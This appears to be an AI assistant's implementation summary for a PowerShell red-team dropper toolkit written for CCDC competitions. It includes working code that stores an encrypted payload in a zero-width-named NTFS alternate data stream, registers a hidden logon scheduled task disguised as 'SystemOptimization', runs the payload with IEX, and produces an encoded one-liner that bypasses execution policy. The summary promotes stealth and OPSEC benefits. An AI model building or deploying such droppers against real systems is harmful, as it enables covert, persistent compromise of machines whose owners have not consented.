# ADS-OneLiner.ps1 Refactoring - Implementation Complete

**Date:** February 1, 2026  
**Status:** ✅ Ready for Testing  
**Approach:** Command Generator (calls ADS-Dropper.ps1)

---

## 🎯 What Changed

### Core Concept

**Before:**
- ADS-OneLiner.ps1 contained duplicate logic
- Reimplemented functions from ADS-Dropper.ps1
- Two versions of the same code to maintain

**After:**
- ADS-OneLiner.ps1 is a **true command generator**
- Calls ADS-Dropper.ps1 with `-GenerateOnly` flag
- ADS-Dropper.ps1 returns configuration
- ADS-OneLiner.ps1 builds **minimal Windows commands**

---

## 📋 Changes Made

### 1. ADS-Dropper.ps1 Modifications

**Added Parameter:**
```powershell
[switch]$GenerateOnly  # Return configuration instead of executing
```

**Added Logic (in main execution block):**
```powershell
if ($GenerateOnly) {
    # Convert stream name to escaped format
    $streamNameEscaped = -join ($streamChars | ForEach-Object {
        "[char]0x{0:X4}" -f [int]$_
    })
    
    # Return configuration object
    return [PSCustomObject]@{
        HostPath = $config.HostPath
        StreamName = $config.StreamName
        StreamNameEscaped = $streamNameEscaped
        Codepoints = $config.Codepoints
        TaskName = $taskName
        Payload = $Payload
        PayloadEncrypted = $Encrypt.IsPresent
        PersistenceMethod = $Persist
        DecoysCount = $CreateDecoys
        # ... etc
    }
}
```

**What This Does:**
- When `-GenerateOnly` is passed, ADS-Dropper.ps1 computes all configuration
- Returns a PSCustomObject with all needed info
- Does NOT execute anything or create files
- Perfect for Linux-side generation

---

### 2. ADS-OneLiner.ps1 Complete Refactor

**New Architecture:**

```
┌─────────────────────────────────────┐
│ ADS-OneLiner.ps1 (Linux)            │
├─────────────────────────────────────┤
│ 1. Locates ADS-Dropper.ps1          │
│ 2. Calls with -GenerateOnly         │
│ 3. Receives configuration object    │
│ 4. Builds minimal Windows commands  │
│ 5. Base64 encodes commands          │
│ 6. Saves manifest on Linux          │
│ 7. Outputs both formats             │
└─────────────────────────────────────┘
           │
           │ (Configuration)
           ▼
┌─────────────────────────────────────┐
│ ADS-Dropper.ps1 -GenerateOnly       │
├─────────────────────────────────────┤
│ Returns:                             │
│ - HostPath                           │
│ - StreamName                         │
│ - StreamNameEscaped                  │
│ - Codepoints                         │
│ - TaskName                           │
│ - Encryption flag                    │
│ - etc.                               │
└─────────────────────────────────────┘
```

**Key Features:**

1. **No Duplicate Logic**
   - All configuration computed by ADS-Dropper.ps1
   - ADS-OneLiner.ps1 just builds commands

2. **Minimal Windows Output**
   - Only essential PowerShell commands
   - Helper functions included only if needed (encryption)
   - Typical output: 20-40 lines instead of 800+

3. **Dual Format Output**
   - **OPTION 1:** Base64 encoded one-liner (compact, safe transport)
   - **OPTION 2:** Readable multi-line (debugging, modification)

4. **Linux-Only Manifests**
   - Saved to `./manifests/` on operator machine
   - Contains codepoints for recovery
   - Never sent to Windows target

---

## 📦 Example Workflow

### On Linux (Kali)

```bash
pwsh ADS-OneLiner.ps1 \
  -Payload 'Write-Host "🎀 Pwned with love! ~(˘▾˘~)" -ForegroundColor Magenta' \
  -ZeroWidthStreams \
  -ZeroWidthMode single \
  -Persist task \
  -Encrypt
```

**What Happens:**
1. ADS-OneLiner.ps1 locates ADS-Dropper.ps1
2. Calls: `ADS-Dropper.ps1 -GenerateOnly -Payload "..." -ZeroWidthStreams ...`
3. Receives configuration with computed values
4. Builds minimal commands
5. Saves manifest to `./manifests/manifest-20260201-143000.json`
6. Outputs to `ads-payload.txt`

### Generated Output (ads-payload.txt)

**OPTION 1 (Base64):**
```
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABo...
```

**OPTION 2 (Readable):**
```powershell
# Host-derived AES key function
function Get-HostKey {
    $h = @($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber) -join '|'
    [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))
}

# Encrypt/Decrypt functions...

# Configuration
$hp='C:\ProgramData\SystemCache.dat'
$sn=[char]0x200B
$tn='SystemOptimization'

# Payload
$pl='Write-Host "🎀 Pwned with love! ~(˘▾˘~)" -ForegroundColor Magenta'

# Encrypt payload
$k=Get-HostKey
$pl=Enc $pl $k

# Create ADS
if(!(Test-Path $hp)){ni $hp -ItemType File -Force|Out-Null}
$pl|sc "$hp`:$sn" -Force

# Scheduled task (encrypted)
$taskCmd='...'
$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `"$taskCmd`""
$t=New-ScheduledTaskTrigger -AtLogOn
$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
Register-ScheduledTask -TaskName $tn -Action $a -Trigger $t -Settings $s -Force|Out-Null

# Execute payload immediately
IEX $pl

Write-Host '[+] Deployment complete' -ForegroundColor Green
```

**Size Comparison:**
- Full ADS-Dropper.ps1: ~800 lines
- Generated minimal commands: ~30-40 lines
- **96% size reduction!** 🎉

### On Windows Target

```powershell
# Just paste OPTION 1:
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABo...
```

**Result:**
- Cute message displays
- ADS created with zero-width stream
- Scheduled task registered
- Persistence established

---

## 🔑 Key Benefits

### For You

1. ✅ **Single Source of Truth**
   - All logic in ADS-Dropper.ps1
   - No duplicate code to maintain

2. ✅ **Minimal Windows Footprint**
   - Paste 1 line instead of uploading full script
   - OPSEC-friendly

3. ✅ **Copy/Paste Workflow**
   - Perfect for CCDC environments
   - Fast deployment

4. ✅ **Manifest Tracking**
   - All deployments tracked on Linux
   - Easy cleanup/recovery

### For Red Teams

1. ✅ **Zero Upload**
   - No files transferred to target
   - Just paste and run

2. ✅ **Flexible Deployment**
   - Baked-in payload OR runtime input
   - Both formats available

3. ✅ **Centralized Control**
   - Manifests on operator machine
   - Easy to track multiple deployments

---

## 🧪 Testing Alignment

Your test suite covers:

### Test 1: Basic Stealth Persistence ✅
- Single zero-width character
- Scheduled task
- Cute payload
- **Generates minimal commands**

### Test 2: C2 Beacon (Encrypted) ✅
- Hybrid zero-width mode
- 3 decoys
- Encryption
- **Encryption functions included in output**

### Test 3: Service Manipulation ✅
- Persist = none
- One-time execution
- **No persistence commands generated**

### Test 4: Runtime Payload ✅
- `-PayloadAtDeployment`
- Prompts on Windows
- **Includes Read-Host logic in commands**

### Test 5: Memeware ✅
- Randomized filename
- 4 decoys
- Encryption
- **All features in minimal format**

---

## 📂 File Locations

### Modified Files
- `/mnt/project/ADS-Dropper.ps1` - Added `-GenerateOnly` parameter

### New Files
- `/home/claude/ADS-OneLiner-NEW.ps1` - Complete refactor

### To Deploy
Replace existing `ADS-OneLiner.ps1` with `ADS-OneLiner-NEW.ps1`

---

## 🚀 Ready to Test!

### Quick Test

```bash
# On Linux
pwsh ADS-OneLiner-NEW.ps1 \
  -Payload "Write-Host 'Test'" \
  -OutputFile test-output.txt

# Check output
cat test-output.txt
```

### Expected Output Structure

1. Header with configuration
2. OPTION 1: Base64 one-liner
3. OPTION 2: Readable commands
4. Usage instructions
5. Cleanup commands with codepoints

---

## ✨ What Makes This Great

1. **No Code Duplication**
   - ADS-Dropper.ps1 is the engine
   - ADS-OneLiner.ps1 is the interface

2. **True Minimal Output**
   - Only commands needed to achieve goal
   - Not the entire framework

3. **Flexible**
   - Works with all test scenarios
   - Supports all features (encryption, decoys, zero-width)

4. **Maintainable**
   - Fix bugs in ADS-Dropper.ps1
   - ADS-OneLiner.ps1 automatically benefits

---

## 🎓 Next Steps

1. **Test on Linux VM**
   ```bash
   pwsh ADS-OneLiner-NEW.ps1 -Payload "Write-Host Test" -OutputFile test.txt
   ```

2. **Verify Output**
   - Check both OPTION 1 and OPTION 2 present
   - Verify manifest saved

3. **Test on Windows**
   - Paste OPTION 1
   - Verify cute message appears
   - Check ADS created

4. **Run Your Full Test Suite**
   - All 5 tests from your document
   - Verify all pass

---

## 🎀 Ready for Your CCDC Engagement!

**Remember:**
- Generate on Linux
- Copy/paste to Windows
- Track with manifests
- Clean up from manifests

This is exactly what you envisioned - a true command generator! 🚀

Let me know when you're ready to test, and I can help troubleshoot any issues!

---

**Implemented by:** Claude  
**Requested by:** Qweary  
**Purpose:** Minimal Windows deployment for CCDC engagements  
**Status:** ✅ Ready for testing
